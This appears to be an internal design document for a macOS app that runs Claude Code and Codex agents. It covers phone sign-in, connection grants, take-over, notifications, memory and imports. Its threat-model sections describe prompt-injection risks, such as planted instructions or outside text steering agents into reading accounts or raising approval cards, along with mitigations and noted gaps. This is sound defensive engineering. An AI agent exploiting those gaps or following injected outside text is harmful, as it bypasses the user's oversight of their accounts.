  "You're in <Agent>'s browser · Hand back" (pinned, with the site and when
  it hands back by itself) and the card says so with **Show window**
  (`agents_step_in_show`) and **Hand back**; ⌘K "Hand <Agent> its browser
  back". The live state is laid over the card on read (`step_in::apply`),
  never stored.
- **Hand back** (`agents_step_in_hand_back`) parks the window, answers the
  card ("Handed back"), leaves a line ("You handed Finance its browser back
  after 4 min · billing.acme.example") and wakes the agent with
  `step_in::resume_note`: the tab, the reason, how long, and where the page
  was and is (the address without its query, fragment or credentials),
  never anything typed nor the page's title: the note is queued as from the
  user, the site writes its title, and a sign-in leaves codes in the query.
  A `wait_for` already waiting when the user steps in stops at the hold.
- **By itself**: the tab closing ("The tab closed while you were in …"), or
  15 minutes with no hand-back (the card reads "Handed back by itself after
  15 min", and the agent is told the user may not have finished and not to
  ask again for the same wall). Checked every 2 s.
- **Not now** (desk or phone, through `agents_answer_approval`) ends any
  hold and wakes the agent with "don't ask again for this", and the same
  site can't be asked about again by that agent for an hour
  (`step_in::ask_again`), so neither it nor a page steering it puts up card
  after card. A typed "approve it" never answers a step-in card
  (`typed_answer::the_card`), and `answer_card` refuses one: a plain Allow
  used to close it with no hold and the agent never woken. A Not now racing
  Hand back wakes the agent once.
- **Never for outside text**: the `browser` server isn't given to those
  turns, the gate refuses the tool for them (`gate_agents_with`), and
  `step_in::check_ask` refuses it again. Not in a take-over, and not with no
  app to put a card in (`tools::dispatch`). An admin can't answer it
  (`admin::classify`: "only you can step into its browser"); the sweep puts
  an unanswered one away like a login card, never while the user is in it.
- **The phone** shows the card with "Step in on your Mac: its tab opens
  there." and **Not now** only; a plain Allow from an older phone is refused
  with "Step in on your Mac". No remote control of the tab in v1 (the
  sign-in screen's frames-and-taps could carry it; not built).
- **Not verified**: a real SSO, passkey, 2FA or CAPTCHA page; a live turn
  calling the tool on either engine; the window coming forward in a built
  app (tested against the fake Chrome only, `step_in_tests.rs`).

**Signing in from the phone** (`agents/phone_signin.rs`, `Via::AgentsBrowser`):

1. A card for a site offers **Sign in here** first (method
   `agent_browser`, either engine). On the phone that button is **Sign in
   from here** and opens `/signin` (no `loginStart`).
2. `agents.signinBegin` opens the site's account page (`probe_url`) in a
   window of the agents' browser owned by the sign-in (no agent's tools can
   reach it; the agent the card is for has its browser refused until it
   ends, `signin::refusal_for`). No extension, so no per-site Allow at the
   Mac.
3. Frames: the window's screencast (`Page.startScreencast`, JPEG q60, at
   most 780px wide), acked at most 15 times a second; the phone asks
   `agents.signinFrame {after: seq}` and the Mac answers with the next
   frame as soon as it's drawn (up to 1.5 s), newest wins, nothing queued
   or kept. Over the authenticated companion socket, and the phone sends
   it only over Tailscale to the Mac it pinned.
4. Input: taps in the picture's pixels, mapped to the page's CSS pixels;
   typing as one `Input.insertText`; the short key list; scrolls. While the
   page's focused field is a password or code, the phone's field turns to
   secure entry by itself (`secure` on the frame). What's typed is never
   logged, audited or kept (as before).
5. **Done** loads the account page in the same window and reads where it
   landed. Signed in: the window closes, and `logins::complete_agents_browser`
   answers the card ("Signed in · www.linkedin.com, in the agents' browser"),
   gives the agent the site, wakes it, and answers every other waiting card
   for the same service (one profile, one sign-in).

**At the desk**, **Sign in here** brings the same window on screen; the card
finishes by itself once the page reads as signed in twice, two seconds
apart (`logins::agents_browser_at_desk`).

**Google and other strict sign-ins.** A page that refuses a driven browser
(`refusal::refuses`: Google's "This browser or app may not be secure",
`/signin/rejected`) comes to the phone as a `blocked` frame with the reason,
and **Sign in another way** (`agents.signinFallback`): the agents' Chrome is
closed and the same profile opens in a plain Chrome app window
(`--app=<url>`, no debugging switch at all, `plain.rs`), which the phone sees
through macOS window capture (`screencapture -l`) and drives with CGEvents
(`macos.rs`). That needs Screen Recording and Accessibility for the app:
Settings → Agents shows both with **Allow…** (Screen Recording's own prompt,
then the System Settings pane). Without them the phone says plainly that
Google needs one sign-in at the Mac. At the desk the plain window just
opens; quitting it (⌘Q) is when the card checks. Either way the agents'
Chrome starts again on the profile and finds the new cookies.

**Not verified** (and why): a real sign-in on any site (nothing was
submitted); Google's refusal page itself (the detection is from its
published words and URL); the plain-window path end to end (capture and
CGEvent input need the two permissions granted to a built app, which
weren't given); the frame rate over cellular; passkeys in the Agents
profile. What was run: see docs/internal/agent-browser.md, "v1".

### Signing in on your Mac from the phone (`agents/phone_signin.rs`)

*Since the agents' browser (above), this is the way only when the agents'
browser isn't here (`Via::Chrome`): its switch off, or no Chrome. The same
screen, methods and rules.*

**The way is decided at "Sign in from here", not when the card was raised**
(`phone_signin::choose`): the agents' browser whenever it's available and
the card names a site, even for a card raised by an older build or while the
switch was off (such cards carry only `oauth` + `browser`; one for Vercel
went to the user's Chrome and sat on "Opening it on your Mac…"). The phone
may ask for a way (`agents.signinBegin {way}`). Opening is bounded: the Mac
answers within 20s (`BEGIN_TIMEOUT`) with which browser was slow ("Chrome on
your Mac isn't answering…"), the phone gives up at 25s on its own, and a
failed start offers **Try again** and **Try the agents' browser**. Every step
is logged at info (begin, the way and why, first picture, each failure),
never a URL or anything typed. Until the Mac answers, the screen names no
browser ("Your Mac").

Owner requirement: when an agent can't get into a site because the Mac's
Chrome isn't signed in, the user can do that sign-in **from the phone**,
instead of being told to go to the computer. A login card with a browser way
in shows **Sign in from here** on the phone (Mac feature `signin.phone`):

1. `agents.signinBegin {agentId, requestId}`: the Mac starts its own
   Claude in Chrome MCP server (`claude --claude-in-chrome-mcp`, as the
   checks do), picks the profile this site was last found in
   (`browser_profiles`), and opens the site's account page (`probe_url`,
   which sends a signed-out visitor to its sign-in) in a tab of the app's
   own, in its own tab group.
2. The phone polls `agents.signinFrame` about three times a second, one
   request at a time: a `computer` screenshot of that tab, re-encoded on the
   Mac as a JPEG at most 1000px wide (well under the socket's 1MB frame).
3. Taps (in the frame's pixels, scaled back on the Mac), typing, a short
   list of keys (Tab, Delete, Enter, …; no modifiers, no shortcuts), Up/Down
   scrolls, Back and Reload go back as `agents.signinInput`. Pinch zooms the
   picture on the phone only. **Password** hides the field as it's typed.
4. **Done** (`agents.signinDone`) opens the account page again and reads
   where it landed (`browser::signed_in`). Signed in: the tab closes and the
   card answers itself through its browser way in ("Using your browser ·
   www.figma.com"), so the agent is woken and carries on. Still on a sign-in
   page: the screen says so and carries on. Can't tell: **Hand it over
   anyway**.

**Why this mechanism.** (a) Claude in Chrome's own MCP server, which the app
already drives, has everything needed (`tabs_create_mcp`, `navigate`,
`computer` screenshot / click / type / key / scroll, `tabs_close_mcp`) and
reaches the user's real Chrome profile, signed-in cookies and all, with
nothing new installed. (b) The DevTools Protocol would stream better
(`Page.startScreencast`), but the user's Chrome has no debugging port, and
relaunching it with one would expose every tab to anything on the Mac. (c)
macOS Screen Sharing over Tailscale works for anything, but shows the whole
screen, needs setup in System Settings and a VNC client, and isn't scoped to
one site. (a) was chosen; (c) remains the honest fallback for what (a) can't
do (below).

**Rules** (tested in `phone_signin_tests.rs` and the router's tests):
- Only through the companion router, so only a paired phone, over the
  Tailscale route; the phone also refuses to begin or type unless the Mac
  proved its pinned identity (`secretRouteProblem`, as for a secret). No
  agent tool reaches it.
- One session on the Mac at a time; frames and inputs are accepted only from
  the device that began it (`Table::check`).
- The tab is shown and driven only on the card's site (its domain:
  `www.figma.com` → `figma.com` and its subdomains), a sibling the site
  signs in on (`x.com` → `twitter.com`), or a sign-in provider
  (`IDP_HOSTS`: Google, Microsoft, Apple, GitHub, Facebook, Slack;
  `IDP_SUFFIXES`: Okta, Auth0, OneLogin, Duo, JumpCloud tenants), `https`
  only. Anywhere else the phone sees "outside the sign-in" and no picture,
  and only Back works. There's no address bar.
- What's typed is never logged, stored or shown to an agent: `Input`'s
  `Debug` gives a length; the router doesn't audit any `agents.signin*`
  call; refusals never quote input; the phone keeps the field in a ref,
  wipes it on send, on leaving the app and on closing the screen. The audit
  line is "phone sign-in · figma.com: started / signed in / stopped on the
  phone / stopped on the Mac / timed out".
- While it's live, every agent's Claude in Chrome call is refused
  (`browser_gate::while_phone_signs_in`), so no agent can look at the tab.
- It ends after five minutes with no input from the phone (looking doesn't
  count) or twenty in all, on Stop on either device, on Done, and when the
  phone leaves the screen. The tab closes each time.
- The desk shows a bar on every conversation, "Your phone is signing in to
  figma.com", with Stop (`PhoneSigninBar`, event `agents://phone-signin`).

**Not covered / not verified.**
- Claude in Chrome's own per-site permission prompt opens on the Mac. A site
  (or sign-in provider) the extension hasn't been allowed on can't be
  opened from the phone: the call times out after about 30s and the phone
  says it must be allowed at the Mac once. Seen on this Mac on 2026-11-05
  while verifying (on example.com).
- A sign-in that opens a pop-up window ("Sign in with Google" as a popup)
  opens outside the tab, so it isn't shown; use the site's own email sign-in
  or a redirect. Passkeys and the macOS / Chrome password manager prompts
  on the Mac aren't reachable either; a code sent to the phone works.
- What's typed passes, as it must, through Claude Code's MCP server process
  and the Claude in Chrome extension on this Mac (local native messaging,
  `isLocal`); whether either logs tool arguments hasn't been checked.
- Not yet run end to end against a real sign-in: the screenshot, click and
  type calls, the coordinate scaling and the frame rate are untested
  against a live tab, because the extension's prompt blocked the read-only
  probe (see above). `tabs_context_mcp` / `tabs_create_mcp` / `tabs_close_mcp`
  in a new group were seen working, and the empty first tab of a new group
  is reused so nothing is left behind.
- Agents whose Claude Code settings pre-allow the Chrome tools would skip
  the broker, and so the refusal; the app's own turns don't.

### Grants, read vs send, and turns

A connection is one account at one service, in `connections.json` (names,
accounts, grants; never a token). Each lists the agents that may use it:

- **Read** grant: a tool whose name reads (`get_`, `list_`, `search_`,
  `read`…, camelCase too) goes through with no card; anything else is
  refused with a line telling the agent to ask for more on a card.
- **Full** grant: reads go through; everything else asks on the usual
  approval card, every time, unless the user chose Always allow for it.
  Never-ask is not offered by the login card.

What a turn gets (`connections::for_turn`, before the process starts):

- **Ours**: the server is the agent bridge's **connection relay**
  (`agents/conn_relay.rs`, `http://127.0.0.1:<port>/mcp/conn/<serverKey>`),
  reached with the turn's own bridge secret (the `--mcp-config` file's
  header for Claude Code; `bearer_token_env_var` naming the bridge's
  variable for Codex). The relay checks the caller's grant, takes a fresh
  token from the Keychain and adds it to the request it forwards to the
  app; the token never leaves the app's process. It forwards only to the
  server the catalogue names for that service (a `connections.json` edited
  to point elsewhere is refused), follows no redirects, passes no
  `www-authenticate` back, and marks a 401/403 as "needs signing in
  again". A token about to expire is refreshed first; a refresh the server
  refuses marks the connection the same way and the turn goes without it
  (its prompt says so).
- **The relay enforces the grant, whatever the engine**: a read-only
  grant refuses a non-read `tools/call`; a write (and, in a turn answering
  outside text, any call) goes through only if `mcp::decide` already
  allowed it (the engine's approval, noted once per call), otherwise the
  relay puts it on a card itself. So Codex's `exec` fallback, which has no
  approval channel, can't write through a connection unasked. A take-over
  is answered at the keyboard, so only the read-only rule applies there.
- **Outside text**: in a turn answering a "When…" routine's items (or a
  message carrying that taint), connection reads ask on a card too
  (`connections::gate(.., outside)`): outside text can't make an agent
  read the user's accounts unasked.
- **claude.ai connectors** load into every Claude Code turn of a claude.ai
  account, so a grant is enforced the other way round: once one is
  connected through a card, every agent *without* a grant gets
  `--disallowedTools mcp__claude_ai_<Name>`. Consequence, on purpose: an
  agent that used the Gmail connector implicitly before stops seeing it
  once Gmail is connected for someone else through a card; its "What it can
  reach" shows nothing for Gmail and a new card gets it back in one click.
- **Browser**: on by default, as before (`--chrome` on every Claude turn);
  "Remove" in What it can reach runs that agent's turns with `--no-chrome`.
  Sites given on cards are recorded and told to the agent; Claude in Chrome
  itself isn't limited to them.
- **Claude Code's own apps** (user scope, every agent): "Block for this
  agent" adds `--disallowedTools mcp__<name>`.

Taking over (`takeover.rs`) gives a Claude Code agent its connection
servers and their prompt lines too; its blocks and `--no-chrome` aren't
applied there (the person at the keyboard answers every prompt), and a
Codex take-over gets no connection servers.

### What it can reach

`agents_reach` per agent (desk; read-only on the phone via `agents.reach`):
connections (account, read / read-and-asks, where the sign-in is kept,
needs-sign-in), the browser (and whether Claude in Chrome's helper is
installed), secrets (variables), and blocked apps. Each is removed in one
click (`agents_reach_remove`): a connection's grant (the connection stays
for others; disconnecting it for everyone deletes its Keychain item), the
browser, a site, a secret (its Keychain items), a block.

### What your team needs (one screen, by service)

`agents_logins_team(since?)` groups every waiting login card by service,
and Gmail + Calendar + Drive as one "Google" row (added in one visit to
claude.ai). Each row lists every agent that asked, with what it asked to
do; one Connect answers them all: the first card of each service signs in,
and when it's connected the others are granted the same connection
(`connect_need`); the browser is given to each agent that can use it.
Untick an agent to leave it out, or "Skip" (`agents_login_dismiss`:
declined with "Not needed", the agent isn't woken; it asks again if it
really needs it). With `since`, rows answered since then are included, so
the screen can say "4 of 9 connected". Identical asks are one line: three
agents asking for a GitHub token are one GitHub row; one agent's two old
LinkedIn cards are one line.

**In "Setting up your team".** The checklist's Logins step hosts this list
scoped to the agents being set up (`scopeTeam`, desk and phone; a Connect
skips everyone else on the row). Secure input cards that aren't logins
stay rows there, grouped by service and named by the app ("Google — Gmail
(2 accounts)") or the key made readable (`team_setup::humanise`:
"email_drafts" → "Email drafts"), never the raw key. An agent whose only
requests are the checklist's isn't counted again in the sidebar's "Needs
your OK · N" (`onlySetupRequests`).

**Stale asks go away.** When an agent gets a service one way, its other
pending asks for it (another login card, an old token card for X when it
now posts through the browser) are marked expired with "Not needed any
more: …" (`retire_stale`).

### Upgrading what's already there

- **Pending secret cards** an older build (or the import) raised for
  something with a connector or a site ("gmail_work", "linkedin_token",
  "x_token") are moved onto login cards at launch (`migrate_pending`,
  matched by the card's *name* only, never its purpose, so "openai_key, to
  summarise into Notion" stays a key;
  idempotent): the old card is marked expired, "Moved to a sign-in card
  for Gmail: no password needed.", and a login card replaces it, `quiet`
  if the old one was (an import's). A second old card for the same service
  folds into the first. A real API key (`stripe_key` as `api_key`) and a
  name we can't place ("Acme OS recruiting tools") stay secret cards.
- **Every agent's prompt** gets the new `## Logins` rules and the narrowed
  `## Secrets` rules each turn: they're app-owned per-turn sections, not in
  anyone's CLAUDE.md, so existing agents get them without their
  instructions being touched. The Chief's default instructions name
  `request_login` for setup; the previous default is in
  `PAST_CHIEF_INSTRUCTIONS`, so `upgrade_chief` swaps it only where the
  user hadn't edited it.
- **Import**: a login by name that means a service becomes a quiet login
  card (`review.rs`); anything else stays a quiet secret card.
- Old data loads: `Approval.login`, `Agent.reach` are additive and skipped
  when empty; a missing `connections.json` is no connections. The protocol
  additions are optional fields and new methods behind `logins`.

### Threat model additions

- **Passwords.** None is ever asked for: no card has a password field for
  a service we know, the tool descriptions and per-turn rules forbid
  asking, and the composer's "Store it securely" hint still catches pasted
  keys. A page that asks for a password inside the browser tier is the
  agent's to stop at (told so); the user's browser keeps its own logins.
- **Tokens at rest**: only in the Keychain, under app-owned items. The
  registry, agent homes, chat logs, the phone, fixtures and the audit log
  never hold one (tests grep the whole agents folder after storing one).
  Every access and refresh token is added to redaction at store and at
  launch, so a token an agent prints is scrubbed from what we write.
- **Tokens in flight to a turn**: none. A turn holds only its bridge
  secret (0600 file / process environment, `reach.rs`), which is revoked
  when the turn ends and works only on this Mac's loopback, through the
  relay's checks. Residual: during a turn, the agent's own process can
  read that secret and call the relay directly, which is no more than the
  turn could do through its tools anyway; the app's responses are seen by
  the model like any tool result.
- **The OAuth flow**: HTTPS-only discovery, authorization, token and
  registration endpoints; PKCE S256 (a server whose metadata doesn't list
  S256 is refused, as the MCP spec requires); a
  random `state` checked on a one-shot 127.0.0.1 listener that ignores
  anything else that knocks; the server as `resource` (RFC 8707) so the
  token is audience-bound; ten-minute limit; Cancel aborts the listener.
  The app is a public client (no secret). On the phone path the phone sees
  the authorization URL and the one-time code, never the verifier or a
  token (see "The code relay's rules").
- **Who can start a sign-in**: only a paired, Mac-identity-verified phone
  or the desk, on a card an agent raised; `option` must be one of that
  card's. An agent can't connect anything itself: it can only raise the
  card. Its ways in come only from the built-in catalogue (`logins::SERVICES`:
  server URLs, sites); nothing the agent passes becomes a URL, client id or
  redirect, so a planted instruction can't put an attacker's OAuth app on
  a card. A turn answering outside text (a "When…" routine) can raise one
  too; it still needs the user's tap.
- **Read vs send** is decided from tool names. A server whose write tool
  is called `get_and_send` would be let through on a read grant; unknown
  shapes ask. On a Full grant every non-read call asks, so this only
  matters for read grants.
- **claude.ai connectors**: their tokens are Anthropic's and the user's
  claude.ai account's, not this Mac's; the card says "the sign-in is held
  there". Our grant is a `--disallowedTools` block, as strong as Claude
  Code's own tool filtering.
- **Account names** come from an OpenID `id_token`'s email, read without
  verifying its signature: it only labels the row, it decides nothing.

### Not verified

- No phone sign-in has been run end to end: the relay rules, the redirect
  parser and the mock round trip are tested, not a real sheet on a device,
  and whether each vendor's registration accepts a custom-scheme redirect
  is unobserved (if one refuses, the card falls back to the Mac).
  `gh auth login --web` with no terminal was observed printing its code;
  a full device sign-in through it wasn't completed. The installed phone
  build lacks `expo-web-browser` until it's rebuilt, so it offers "Finish
  on your Mac" for OAuth until then.
- No Connect has been signed in end to end from this build: the OAuth code
  is tested against RFC vectors, a loopback listener and the vendors' live
  metadata (read-only), not a real authorization. Each vendor's consent
  page, its registration answer and its tool names are unobserved.
- The claude.ai path relies on `claude mcp list` naming connectors
  "claude.ai <Name>" (observed for Google Drive and Claude Docs, not for
  Gmail, Calendar or Slack, which aren't connected on the dev Mac).
- Claude in Chrome in `--print`: verified that its tools load when the
  extension is connected (see `claude.rs`); `--no-chrome` removing them, and
  the helper-file check as "installed", are not verified.
- The connection relay is unit-tested (grant rules, routing, the token
  never in anything a turn is given), not run against a vendor's server:
  its streamed (SSE) answers and session headers are passed through as
  the MCP spec describes, unobserved end to end. Codex and Claude Code
  reach it exactly as they reach our own server (verified shapes).

## Steering a working agent

Sending mid-turn queues the message for the next turn (default). The newest
queued bubble says "Queued, sends when <agent> finishes" with **Interrupt and
send now**, and the working indicator sits above the run of queued messages
at the end (what it's doing now, then what's waiting); ⌘↵ in the composer sends and interrupts at once. A message is
queued when it was sent after the turn in progress began (`isQueued`: its `ts`
is after `status.since`). `agents_interrupt` cancels the turn without dropping
the queue (Stop drops it); the cut-off reply is kept as `stopped`, a note
"Interrupted to read your new message" is recorded, and the next turn's prompt
opens with `prompts::interrupted`: what it was working on, its last step, and
that the work already done stands. A card the interrupted turn was waiting on
stays live, with the usual late-Allow behaviour.

Esc in an empty composer stops a working agent only when pressed twice within
1.5s: the first shows "Esc again to stop <agent>" where the hint goes, so a
reflexive Esc never drops a turn. ⌘K also lists "Stop <agent>" for every agent
that isn't idle (with a confirm), Allow / Deny for the oldest card waiting on
you, "Next agent that needs you" (⌘J: a card, or a turn that didn't finish;
the Needs you row's tooltip says ⌘J too), and the open agent's own actions,
everything in its … menu by name: Edit, Pin / Unpin, Mute / Unmute, Hide /
Show, Mark as unread, Start fresh, Open <agent>'s project (when it works in
one) and Delete (with the same confirm). The stop control is a square glyph,
"Stop (Esc twice)".

**Activity, in words** (`plainActivity`). The engine's activity line
("Editing PricingTable.tsx", "$ npm test", "Reading …/src/App.tsx") is shown
as a person would say it — "Working on the pricing table", "Running a
command", "Reading the app" — in the header, the sidebar, the working
indicator, delegation lines and What's in flight. A line that's already plain
("Drafting the reminders") is left alone; only file names, paths, commands
and URLs are put into words.

## Take over (`src-tauri/src/agents/takeover.rs`)

Step into the agent's own session and drive it by hand, then hand it back.
From the agent menu ("Take over" / "Hand back"), the ⋯ beside the working
line, and ⌘K ("Take over <agent>" for the agent you're looking at only;
"Hand <agent> back" for any agent you're driving). Offered once
the agent has a conversation on its engine (`sessionId`, not `newEngine`).

- **Paused.** `runner::claim_for_takeover` sets `driven` on the agent's
  runtime under the inbox lock, and only while no turn is running or waiting
  for a slot. While driven no turn starts: messages from you, the phone,
  other agents and one-time check-ins wait in the queue (and in `inbox.json`);
  a routine coming due is skipped, moved to its next time, recorded as a
  `skipped` run, with a note ("Skipped “Morning brief” · you were driving
  Finance"). `list_agents` tells other agents their messages wait. Start
  fresh, and a change of engine or project, are refused until hand-back —
  for the editor and the Chief's `update_agent` alike, through one helper
  (`runner::update_settings`) that checks under the same lock the claim is
  made under. Deleting (`takeover::delete_agent`, used by both the command
  and the Chief's `delete_agent`) stops the turn first, then ends the
  take-over dropping its queue, so nothing starts a turn on the way out;
  only then is the agent's copy cleaned up (`task::abandon`: pending work
  committed on its branch first, the copy kept if anything couldn't be), so
  the terminal is gone from the copy before the copy is. An update must pass
  both guards: no engine/project/work-directly change while driven, and no
  rebind while a copy is open (`task::refuse_rebind`). Keep and Discard are
  refused while driven, since the terminal is working in the copy.
- **Mid-turn** the session is in use, so take-over is refused and the UI asks:
  **Stop and take over** (Stop, as ever dropping the queue; then waits for the
  turn to end, ≤15s) or **Wait**.
- **The process** is spawned in Rust (`pty_session::open_session`), so the
  bridge token and the agent's secrets never enter the webview: the engine's
  interactive CLI resumed on the agent's session, in the turn's working dir
  (`project::layout`: home, its project, or its open copy of the project —
  exactly where a turn would run), with the turn's environment (PATH, secrets,
  `MCP_TOOL_TIMEOUT`, the nested-session variables removed, no workspace
  account variables) and the turn's own command line minus what only a
  headless turn needs:
  - Claude Code: `claude::interactive_args` = a turn's args without
    `--print`, `--output-format`, `--verbose`, `--include-partial-messages`,
    `--permission-prompt-tool` (it asks in the terminal, to you): `--chrome
    --resume <session> --permission-mode acceptEdits --mcp-config …
    --allowedTools mcp__app --append-system-prompt … --add-dir …`.
    Its secret is granted with no turn (and revoked at hand-back), so anything
    that reaches `approve` is refused; the agent's other tools (message an
    agent, share a file) work.
  - Codex: `codex resume -c sandbox_mode="workspace-write" -c
    approval_policy="on-request" -c developer_instructions=… <every turn's
    -c> [-m model] -C <cwd> <thread>`. `developer_instructions` is the
    agent's identity plus its secrets section, as a `codex exec` turn passes
    it. Built from `codex resume --help` on 0.166; not run against a real
    thread (no signed-in account on the build machine).
  The PTY has no project in its metadata, so remote access and other agents'
  `session_*` tools can't see or type into it, and the phone is never sent
  its id. Its id starts `takeover-`: a tab's `pty_session_open` may attach to
  it while it runs but never respawns it, and the take-over's watcher also
  checks the pid, so a respawn can't pass for the take-over.
- **Edits are auto-accepted while you drive**, as they are for the agent
  (Claude Code's `acceptEdits`, Codex's `workspace-write`), in its projects
  too. Bash still asks. The bar's tooltip says so once; Shift-Tab changes
  it in Claude Code.
- **Trust.** If Claude Code hasn't recorded the folder as trusted
  (`hasTrustDialogAccepted` on it or a folder above, in `.claude.json` under
  `CLAUDE_CONFIG_DIR` or home — read, never written), the bar adds:
  "Claude Code will ask whether to trust this folder — choose “Yes,
  proceed”. Choosing No hands it back." Codex's trust prompt isn't
  checked.
- **Where.** A bound agent's session becomes a tab in its project's workspace
  (`adoptTakeover` + focus, through `useRemoteAgentControl`), which opens. The
  tab is never saved: `set_terminal_state` drops `takeover-` tabs, and
  `get_terminal_state` drops any on disk and adds the ones running now, so
  a quit, crash or hand-back leaves no ghost tab to respawn.
  Any other agent's shows in its chat in place of the conversation
  (`AttachedTerminal`, attach-only), with "Show chat" to see the conversation
  and composer. Either way a bar above the composer (with the other bars;
  under the terminal when it fills the column) says "You're driving
  Finance in a terminal · Hand back"; the sidebar row reads "You're driving
  Finance" unless a request outranks it; the header stays identity only.
  A message you send waits ("Waiting, sends when you hand Finance back").
  Keep changes and Discard on its copy are disabled until it's handed back
  (the backend refuses them too), and the fresh nudge doesn't show.
- **Hand back** (the button, ⌘K, or the process exiting, noticed within
  0.5s). If the terminal printed in the last 2s it is likely mid-response,
  so the button asks first ("Hand back anyway?"); anything typed but not sent
  is dropped. Ctrl-C three times, 300ms apart (Claude Code's first clears the
  prompt, its second arms "press again"), then up to 5s for it to exit; only
  a process still alive with the session on its command line is killed
  (pids get reused). Only then is `driven` released, so a turn and the
  terminal never share the session. A note says "You handed Finance back after 6 min";
  if the session's transcript grew, the next turn starts with
  `prompts::handed_back`. Start fresh and an engine switch clear that
  preamble. A bound agent's tab is closed (`remote-close-agent`). Deleting
  the agent ends a take-over without a note.
- **Closed by itself early** (within 10s, or with a non-zero exit — the
  trust question answered No, a rejected flag, a crash): a quiet note
  (`kind: note`, `takeover: true`), not an error — it isn't the agent
  failing — says so plainly with the terminal's last lines in a mono block
  (`remote_access::screen::render_tail`), no preamble, and no Retry. Being a
  note, it sets no failure, alerts nobody, and peers and the phone never
  call it "didn't finish". Older builds wrote it as an error; those still
  render with the block and no Retry.
- **Phone:** the overview carries `takeover` (without the PTY id); the phone
  says "Being driven on your Mac" on the row, the chat header, the composer
  and a queued message, the only phrasing it uses for this, offers no Stop,
  and queued messages wait. It can't take over.
- **One mark on disk.** `<home>/takeover.json` (pid, session) from open to
  hand-back. At the next launch a leftover mark means the app quit or crashed
  mid-take-over: the CLI is stopped if it outlived the app (only while it is
  still that CLI), and the chat says the take-over ended. What waited is sent
  like any interrupted queue.

Verified for Claude Code 2.1.318 with a throwaway folder on Haiku (about two
cents): `--print --session-id`, then interactive `--resume` in a PTY (a new
message, Ctrl-C twice exits), then `--print --resume` recalled both turns
under the same session id. In a folder Claude Code hasn't been told to trust,
the interactive CLI first shows its own trust dialog (default "No, exit"),
which the person at the keyboard answers; nothing is trusted for them.

## Notifications (`src-tauri/src/agents/notify.rs`)

The backend decides, since it knows when a message is recorded and when a turn ends.

- **On screen** = a *focused* window is showing that agent (`agents_focus` reports which agent each window shows; focus is asked of the window at that moment). Messages on screen neither notify nor count as unread.
- A reply or error off screen notifies with the agent's name and the first line. Inside a turn they are held and posted once when it ends, with the latest text. An approval posts at once, with a sound.
- Bursts across agents are capped (3 per 20s); the rest stay silent but still count.
- **Mute** (row context menu) stops OS notifications for that agent; a bell-off mark shows in its row. Unread and the badge still count it.
- **Dock badge** = how many agents need you, the one count every surface shows: the sidebar's "Needs your OK · N", the review bar in the Chief's chat, the phone's Home bar, tab badge and icon badge (`needsYouCount`, `packages/companion-protocol/src/attention.ts`; Rust mirrors it in `notify::needs_you`, and both run `attention-cases.json`). The Chief counts like anyone; unread replies and usage limits don't. The mode toggle's badge is on whenever any non-hidden agent is waiting or unread. Approval cards don't add to unread; they count as pending until answered.
- Clicking a notification focuses a window and emits `agents://open`; the app switches to Agents and opens that agent. Focusing a window clears the unread of the agent it shows.
- Uses `tauri-plugin-notification` (2.8, click reporting on macOS). Not verified in a real build yet: the dev binary posts under another app's identity, so click-through should be checked in a signed build.

## Memory you can see (`src-tauri/src/agents/memory.rs`)

The agent editor has two tabs, Agent and Memory. Memory lists the `## Memory`
section of the agent's CLAUDE.md as entries (each top-level list item or
paragraph; a `### Imported from …` heading groups what came with an import),
with add, edit and delete applied at once and Undo in a toast. Nothing is
re-rendered: a change splices only that entry's lines, so the instructions,
the agent's own formatting, code fences, CRLF and the rest stay byte for
byte. An edit or delete names the entry by position and its text as shown;
if the agent rewrote it meanwhile, the change is refused and the list reloads.
Deleting returns the exact lines removed, which Undo puts back.

**Remember this** (hover a message): Claude Code on Haiku turns the message
into one line (`--tools "" --strict-mcp-config --no-session-persistence`,
45 s at most; the message's opening if that can't run), shown in a small
dialog to edit before it's added. Cmd+K → "Edit what <agent> remembers…" opens
the tab.

## Import from Grok Bot (or any connected assistant)

**A handover outside an import is one card.** An outside assistant can also
dump what it knows on the Chief through `ask_chief` (Remote Access) without
any import started. Packets that read as a handover (`handoff: true`, a long
list of facts with no question, or the next part from a source that already
has one open) are collected per source and no model turn runs for them
(`agents/handoff.rs`). After 45 quiet seconds (or `done: true`) they become
one card in the Chief's chat, "Grok Bot sent what it knows: N parts", with
**Review** (the parts), **Ignore** and **Save to memory**; a late part folds
into the unanswered card. Save to memory hands the parts to the Chief as a
turn the user authorised: keep what's worth keeping in memory and brief the
agents each part belongs to, anything in it asking for more listed for the
user, not done. Ignore runs nothing. The card has no tool call, so no level,
rule or admin answers it; it survives a restart; credentials are refused per
part. A plain question still gets the Chief's answer, as before. Unposted
parts live in memory only (a restart drops them; nothing was saved).

The goal of an import is that each agent arrives understanding everything it
is supposed to do, so working with it here feels like carrying on in the
other assistant: its role and full instructions, every routine and schedule,
everything it watches for, the apps it uses, the user's preferences and its
standing context. Past conversations are a bonus, capped (below).

Only the other assistant knows its own agents, instructions and memory, so the
import runs from its side, over Remote Access. Nothing it sends becomes an
agent by itself: before anything is created the Chief **plays the plan back**
to the user and asks what's missing, then every connector import ends on one
review card in the Chief's chat, and the user imports what they keep
(`agents/harvest.rs`, `agents/review.rs`).

**Asked once, then in the background.** Onboarding's last step asks
everyone new "Bring your agents from Grok, ChatGPT or another assistant, or
start fresh?" (its import path is three screens: Remote access on, the link
in the assistant, the message). An install from before that question gets
one card at the top of the Chief's chat (`ImportChoiceCard`) and on the
phone's home, asking once. The answer is the Mac's
(`agents::import_choice`, `import-choice.json` beside the agents; carried on
the overview as `importChoice`, set by `agents_set_import_choice` /
`agents.setImportChoice`); any import that brings something across sets it
to `imported`. Afterwards there is no Import row in the sidebar: import is
⌘K "Import agents…", the Chief, Settings → Agents → Import, and the phone's
⋯ menu.

**Import agents** lists **From another assistant** first, and opens there;
**From Ship Studio** is the second segment, opened when asked for (⌘K
"Import agents from Ship Studio…"), since few people have agents there. ⌘K
"Import agents from another assistant…" opens the first.

The **Import agents** button leads with a conversation (`agents/connector.rs`,
the full threat model in docs/remote-access.md):

1. The user presses **Start** (one import, until it ends or the app quits),
   then sends their other assistant one message (`import::import_prompt`).
2. Its first `import_conversation` call puts an Allow / Deny card in the
   Chief's chat ("Grok wants to bring its agents over"). Nothing is shared or
   delivered until Allow.
3. It then talks to a **sealed interview** (`agents/interview.rs`): a
   throwaway Claude Code session that speaks as the Chief but has no built-in
   tools, no settings or CLAUDE.md, no folders, not the Chief's session or
   rules, and only `propose_agent` / `update_proposal` / `list_agents` /
   `record_area` / `finish`, which stage a draft. **No bubble per packet:**
   the exchanges aren't written to the Chief's chat; one live line says how
